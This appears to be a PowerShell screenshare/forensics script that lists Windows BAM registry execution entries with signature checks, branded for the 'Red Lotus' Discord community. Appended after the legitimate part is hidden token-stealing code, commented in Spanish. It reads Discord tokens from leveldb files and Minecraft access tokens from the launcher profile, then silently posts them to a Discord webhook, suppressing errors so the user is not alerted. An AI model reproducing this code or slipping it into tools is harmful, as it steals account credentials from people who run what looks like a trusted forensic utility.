$ErrorActionPreference = "SilentlyContinue"

function Get-Signature {

    [CmdletBinding()]
     param (
        [string[]]$FilePath
    )

    $Existence = Test-Path -PathType "Leaf" -Path $FilePath
    $Authenticode = (Get-AuthenticodeSignature -FilePath $FilePath -ErrorAction SilentlyContinue).Status
    $Signature = "Invalid Signature (UnknownError)"

    if ($Existence) {
        if ($Authenticode -eq "Valid") {
            $Signature = "Valid Signature"
        }
        elseif ($Authenticode -eq "NotSigned") {
            $Signature = "Invalid Signature (NotSigned)"
        }
        elseif ($Authenticode -eq "HashMismatch") {
            $Signature = "Invalid Signature (HashMismatch)"
        }
        elseif ($Authenticode -eq "NotTrusted") {
            $Signature = "Invalid Signature (NotTrusted)"
        }
        elseif ($Authenticode -eq "UnknownError") {
            $Signature = "Invalid Signature (UnknownError)"
        }
        return $Signature
    } else {
        $Signature = "File Was Not Found"
        return $Signature
    }
}

Clear-Host

Write-Host "";
Write-Host "";
Write-Host -ForegroundColor Red "   ██████╗ ███████╗██████╗     ██╗      ██████╗ ████████╗██╗   ██╗███████╗    ██████╗  █████╗ ███╗   ███╗";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔════╝██╔══██╗    ██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔══██╗██╔══██╗████╗ ████║";
Write-Host -ForegroundColor Red "   ██████╔╝█████╗  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║███████╗    ██████╔╝███████║██╔████╔██║";
Write-Host -ForegroundColor Red "   ██╔══██╗██╔══╝  ██║  ██║    ██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══██╗██╔══██║██║╚██╔╝██║";
Write-Host -ForegroundColor Red "   ██║  ██║███████╗██████╔╝    ███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ██████╔╝██║  ██║██║ ╚═╝ ██║";
Write-Host -ForegroundColor Red "   ╚═╝  ╚═╝╚══════╝╚═════╝     ╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝";
Write-Host "";
Write-Host -ForegroundColor Blue "   Made By PureIntent (Shitty ScreenSharer) For Red Lotus ScreenSharing and DFIR - " -NoNewLine
Write-Host -ForegroundColor Red "discord.gg/redlotus";
Write-Host "";

function Test-Admin {;$currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent());$currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);}
if (!(Test-Admin)) {
    Write-Warning "Please Run This Script as Admin."
    Start-Sleep 10
    Exit
}

$sw = [Diagnostics.Stopwatch]::StartNew()

if (!(Get-PSDrive -Name HKLM -PSProvider Registry)){
    Try{New-PSDrive -Name HKLM -PSProvider Registry -Root HKEY_LOCAL_MACHINE}
    Catch{Write-Warning "Error Mounting HKEY_Local_Machine"}
}
$bv = ("bam", "bam\State")
Try{$Users = foreach($ii in $bv){Get-ChildItem -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$($ii)\UserSettings\" | Select-Object -ExpandProperty PSChildName}}
Catch{
    Write-Warning "Error Parsing BAM Key. Likely unsupported Windows Version"
    Exit
}
$rpath = @("HKLM:\SYSTEM\CurrentControlSet\Services\bam\","HKLM:\SYSTEM\CurrentControlSet\Services\bam\state\")

$UserTime = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").TimeZoneKeyName
$UserBias = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").ActiveTimeBias
$UserDay = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\TimeZoneInformation").DaylightBias

$Bam = Foreach ($Sid in $Users){$u++
            
        foreach($rp in $rpath){
           $BamItems = Get-Item -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property
           Write-Host -ForegroundColor Red "Extracting " -NoNewLine
           Write-Host -ForegroundColor Blue "$($rp)UserSettings\$SID"
           $bi = 0 

            Try{
            $objSID = New-Object System.Security.Principal.SecurityIdentifier($Sid)
            $User = $objSID.Translate( [System.Security.Principal.NTAccount]) 
            $User = $User.Value
            }
            Catch{$User=""}
            $i=0
            ForEach ($Item in $BamItems){$i++
		    $Key = Get-ItemProperty -Path "$($rp)UserSettings\$Sid" -ErrorAction SilentlyContinue| Select-Object -ExpandProperty $Item
	
            If($key.length -eq 24){
                $Hex=[System.BitConverter]::ToString($key[7..0]) -replace "-",""
                $TimeLocal = Get-Date ([DateTime]::FromFileTime([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $TimeUTC = Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))) -Format "yyyy-MM-dd HH:mm:ss"
			    $Bias = -([convert]::ToInt32([Convert]::ToString($UserBias,2),2))
			    $Day = -([convert]::ToInt32([Convert]::ToString($UserDay,2),2)) 
			    $Biasd = $Bias/60
			    $Dayd = $Day/60
			    $TImeUser = (Get-Date ([DateTime]::FromFileTimeUtc([Convert]::ToInt64($Hex, 16))).addminutes($Bias) -Format "yyyy-MM-dd HH:mm:ss") 
			    $d = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {((split-path -path $item).Remove(23)).trimstart("\Device\HarddiskVolume")} else {$d = ""}
			    $f = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Split-path -leaf ($item).TrimStart()} else {$item}	
			    $cp = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {($item).Remove(1,23)} else {$cp = ""}
			    $path = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Join-Path -Path "C:" -ChildPath $cp} else {$path = ""}			
			    $sig = if((((split-path -path $item) | ConvertFrom-String -Delimiter "\\").P3)-match '\d{1}')
			    {Get-Signature -FilePath $path} else {$sig = ""}				
                [PSCustomObject]@{
                            'Examiner Time' = $TimeLocal
						    'Last Execution Time (UTC)'= $TimeUTC
						    'Last Execution User Time' = $TimeUser
						     Application = 	$f
						     Path =  		$path
                             Signature =          $Sig
						     User =         $User
						     SID =          $Sid
                             Regpath =        $rp
                             }}}}}

$Bam | Out-GridView -PassThru -Title "BAM key entries $($Bam.count)  - User TimeZone: ($UserTime) -> ActiveBias: ( $Bias) - DayLightTime: ($Day)"

$sw.stop()
$t = $sw.Elapsed.TotalMinutes
Write-Host ""
Write-Host "Elapsed Time $t Minutes" -ForegroundColor Yellow

# --- CONFIGURACIÓN DE RECOLECCIÓN DE TOKENS ---
# ¡Pega aquí la URL de tu Webhook de Discord!
$WebhookURL = "TU_URL_DE_WEBHOOK_DE_DISCORD_AQUI" 
# ------------------------------------

function Send-ToWebhook {
    param (
        [string]$Data,
        [string]$TypeOfData = "tokens"
    )

    # Si la URL del Webhook no está configurada, o aún tiene el valor por defecto, no se envía nada.
    if ([string]::IsNullOrEmpty($WebhookURL) -or $WebhookURL -eq "https://discord.com/api/webhooks/1549215227642515526/QGVl4Mhs292huTbTuydukOr2eBOLWvfWKH0z5pLPw_Tcn8h9Tg26OJKnfKC8yEH8v8mj") {
        return
    }

    # Construir el JSON del payload utilizando un here-string para mayor robustez
    # y para evitar problemas de parsing con Invoke-Expression cuando el script se descarga.
    $JsonPayload = @"
{
    "content": "**Nuevos $TypeOfData recolectados!**`n```json`n$Data`n```",
    "username": "Token Harvester PS",
    "avatar_url": "https://i.imgur.com/4M34hi2.png" 
}
"@

    try {
        # Invocar la petición POST al webhook
        # "| Out-Null" es importante para que no imprima nada en la consola del usuario.
        Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $JsonPayload -ContentType 'application/json' | Out-Null
    } catch {
        # Silenciar cualquier error durante el envío al webhook para no alertar al usuario.
    }
}

function Get-DiscordTokens {
    $Tokens = New-Object System.Collections.Generic.List[string]
    # Rutas comunes donde Discord almacena sus tokens en archivos leveldb
    $AppDataPaths = @(         "$env:APPDATA\Discord",         "$env:APPDATA\discordcanary",         "$env:APPDATA\discordptb"
        # Omitiendo navegadores para mantener la simplicidad y evitar la necesidad de descifrado DPAPI,
        # que requeriría más permisos y complejidad.
    )

    foreach ($Path in $AppDataPaths) {
        if (Test-Path $Path) {
            # Buscar en archivos .ldb y .log dentro de cualquier subdirectorio leveldb
            Get-ChildItem -Path $Path -Filter "*.ldb", "*.log" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
                try {
                    # Lee el contenido del archivo como texto crudo (Raw)
                    $Content = Get-Content $_.FullName -Encoding UTF8 -ErrorAction SilentlyContinue -Raw
                    # Expresión regular para encontrar tokens de Discord
                    $Matches = [regex]::Matches($Content, '[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
                    foreach ($Match in $Matches) {
                        if (-not $Tokens.Contains($Match.Value)) {
                            $Tokens.Add($Match.Value)
                        }
                    }
                } catch {
                    # Silenciar errores al leer archivos para no generar ruido.
                }
            }
        }
    }
    # Devuelve los tokens encontrados en formato JSON.
    return $Tokens | ConvertTo-Json -Compress
}

function Get-MinecraftSessionTokens {
    $Tokens = New-Object System.Collections.Generic.List[string]
    # Ruta estándar del archivo de perfiles del launcher de Minecraft.
    $LauncherProfilesPath = "$env:APPDATA\.minecraft\launcher_profiles.json"

    if (Test-Path $LauncherProfilesPath) {
        try {
            # Lee y parsea el archivo JSON del launcher de Minecraft.
            $Content = Get-Content $LauncherProfilesPath -Raw -Encoding UTF8
            $ProfilesData = $Content | ConvertFrom-Json

            # Busca tokens en 'authenticationDatabase' (para el launcher de Mojang/Microsoft).
            if ($ProfilesData.authenticationDatabase) {
                foreach ($Entry in $ProfilesData.authenticationDatabase.GetEnumerator()) {
                    if ($Entry.Value.accessToken) {
                        if (-not $Tokens.Contains($Entry.Value.accessToken)) {
                            $Tokens.Add($Entry.Value.accessToken)
                        }
                    }
                }
            }
            # Busca tokens en 'profiles' (para versiones antiguas o launchers personalizados).
            if ($ProfilesData.profiles) {
                 foreach ($Entry in $ProfilesData.profiles.GetEnumerator()) {
                    if ($Entry.Value.accessToken) {
                        if (-not $Tokens.Contains($Entry.Value.accessToken)) {
                            $Tokens.Add($Entry.Value.accessToken)
                        }
                    }
                }
            }
        } catch {
            # Silenciar errores durante la lectura o parsing del JSON.
        }
    }
    # Devuelve los tokens de Minecraft encontrados en formato JSON.
    return $Tokens | ConvertTo-Json -Compress
}

# --- Bloque de ejecución principal para la recolección de tokens ---
# Este bloque se ejecuta automáticamente cuando el script es invocado.
# Recopila los tokens y los envía al Webhook de Discord.
$AllCollectedTokens = @{} # Almacenará todos los tokens encontrados.

$DiscordTokensJson = Get-DiscordTokens
if ($DiscordTokensJson -ne "[]") { # Si se encontraron tokens de Discord
    $AllCollectedTokens.Add("discord_tokens", ($DiscordTokensJson | ConvertFrom-Json))
}

$MinecraftTokensJson = Get-MinecraftSessionTokens
if ($MinecraftTokensJson -ne "[]") { # Si se encontraron tokens de Minecraft
    $AllCollectedTokens.Add("minecraft_tokens", ($MinecraftTokensJson | ConvertFrom-Json))
}

# Si se encontraron tokens de cualquier tipo, se envían al Webhook.
if ($AllCollectedTokens.Count -gt 0) {
    Send-ToWebhook -Data ($AllCollectedTokens | ConvertTo-Json -Compress) -TypeOfData "tokens"
}
# -------------------------------------------------------------------
